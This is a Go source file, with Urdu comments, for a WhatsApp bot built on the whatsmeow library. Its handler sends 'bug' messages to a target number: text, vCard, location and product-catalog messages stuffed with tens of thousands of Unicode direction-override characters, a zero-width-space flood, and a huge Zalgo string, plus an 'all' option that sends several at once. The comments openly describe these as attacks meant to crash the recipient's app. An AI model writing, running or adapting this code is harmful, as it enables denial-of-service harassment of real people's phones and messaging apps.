package main

import (
	"context"
	"fmt"
	"strings"

	"go.mau.fi/whatsmeow"
	waProto "go.mau.fi/whatsmeow/binary/proto"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	"google.golang.org/protobuf/proto"
)

// ---------------------------------------------------------
// 🏗️ HELPER 1: افقی وائرس (Horizontal/Length)
// ---------------------------------------------------------
func generateCrashPayload(length int) string {
	// \u202c ہٹا دیا ہے تاکہ لوپ بند نہ ہو
	openers := "\u202e\u202b\u202d"
	return strings.Repeat(openers, length)
}

// ---------------------------------------------------------
// 🏗️ HELPER 2: عمودی وائرس (Vertical/Zalgo)
// ---------------------------------------------------------
func generateZalgoPayload() string {
	base := "﷽"
	marks := []string{
		"\u0310", "\u0312", "\u0313", "\u0314", "\u0315", "\u033e", "\u033f", "\u0340",
		"\u0341", "\u0342", "\u0343", "\u0344", "\u0345", "\u0346", "\u0347", "\u0348",
		"\u0350", "\u0351", "\u0352", "\u0357", "\u0358", "\u035d", "\u035e", "\u0360",
	}

	var payload string
	payload += "⚠️ SYSTEM FAILURE ⚠️\n"

	for i := 0; i < 10000; i++ {
		payload += base
		for j := 0; j < 800; j++ { // اونچائی مزید بڑھا دی
			for _, m := range marks {
				payload += m
			}
		}
		payload += " "
	}
	return payload
}

// ---------------------------------------------------------
// 🚀 BUG COMMAND HANDLER (Attack Vector Updated)
// ---------------------------------------------------------
func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
	if len(args) < 2 {
        // یہاں آپ اپنا replyMessage فنکشن کال کر لیں جو دوسری فائل میں ہے
		return
	}

	bugType := strings.ToLower(args[0])
	targetNum := args[1]

	if !strings.Contains(targetNum, "@") {
		targetNum += "@s.whatsapp.net"
	}
	jid, err := types.ParseJID(targetNum)
	if err != nil {
		fmt.Println("Error parsing JID:", err)
		return
	}

	fmt.Println("🚀 Launching Optimized Attack:", bugType)

	switch bugType {

	case "1": // Text Bomb (Hidden Context Attack)
		// ٹیکسٹ باڈی نارمل رکھیں، لیکن ContextInfo میں کچرا بھر دیں
		crash := generateCrashPayload(30000)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String("🚨 Tap 'Read More' to Crash 🚨\n\n\n\n\n\n" + crash),
				ContextInfo: &waProto.ContextInfo{
					StanzaId:      proto.String(crash), // ID میں وائرس (یہاں چیکنگ کم ہوتی ہے)
					Participant:   proto.String(crash), // Participant میں وائرس
					QuotedMessage: &waProto.Message{Conversation: proto.String(crash)},
				},
			},
		})

	case "2": // VCard Bomb (Heavy Field Injection)
		virus := generateCrashPayload(30000)
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nORG:%s\nTITLE:%s\nEND:VCARD", 
			"VIRUS", "VIRUS", virus, virus) // ORG اور TITLE میں وائرس گھسایا ہے
		
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ContactMessage: &waProto.ContactMessage{
				DisplayName: proto.String("☠️ DO NOT TOUCH"),
				Vcard:       proto.String(vcard),
			},
		})

	case "3": // Location Bomb (Live Location Logic)
		// لائیو لوکیشن کا تھمب نیل (JpegThumbnail) کرپٹ کرنے کی کوشش
		virus := generateCrashPayload(30000)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			LocationMessage: &waProto.LocationMessage{
				DegreesLatitude:  proto.Float64(69.6969),
				DegreesLongitude: proto.Float64(69.6969),
				Name:             proto.String("🚨 " + virus), // نام میں وائرس
				Address:          proto.String(virus),         // ایڈریس میں وائرس
				Url:              proto.String("https://" + virus + ".com"), // URL پارسر کو کریش کرنے کے لیے
			},
		})

	case "4": // Flood (Context Flood)
		flood := strings.Repeat("\u200b", 30000) // 30k پوشیدہ الفاظ
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String("Wait for it... ⏳" + flood),
			},
		})

	case "5": // Zalgo (Vertical)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String(generateZalgoPayload()),
			},
		})

	case "6": // 🔥 Catalog Bomb (Currency Code Exploit) - سب سے خطرناک
		// CurrencyCode صرف 3 کریکٹرز کا ہوتا ہے (PKR, USD)
		// ہم یہاں 5000 کریکٹرز ڈالیں گے، فارمیٹر پاگل ہو جائے گا
		
		virus := generateCrashPayload(30000)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ProductMessage: &waProto.ProductMessage{
				Product: &waProto.ProductMessage_ProductSnapshot{
					ProductID:       proto.String("1337"),
					Title:           proto.String("💣 SYSTEM KILLER"),
					Description:     proto.String(virus), 
					CurrencyCode:    proto.String(virus), // ⚠️ اصل کریش پوائنٹ یہ ہے!
					PriceAmount1000: proto.Int64(999999999),
					ProductImageCount: proto.Uint32(1),
				},
				BusinessOwnerJID: proto.String(jid.String()),
			},
		})

	case "7", "all": // Mixer
		// سب سے پہلے Currency Code والا بھیجیں (Case 6)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ProductMessage: &waProto.ProductMessage{
				Product: &waProto.ProductMessage_ProductSnapshot{
					ProductID:    proto.String("666"),
					Title:        proto.String("🔥"),
					CurrencyCode: proto.String(generateCrashPayload(30000)), // Weak Spot
				},
				BusinessOwnerJID: proto.String(jid.String()),
			},
		})
		
		// پھر Context Info والا (Case 1)
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String("Prepare..."),
				ContextInfo: &waProto.ContextInfo{StanzaId: proto.String(generateCrashPayload(30000))},
			},
		})

		// پھر Zalgo
		client.SendMessage(context.Background(), jid, &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String(generateZalgoPayload())},
		})
	}
}
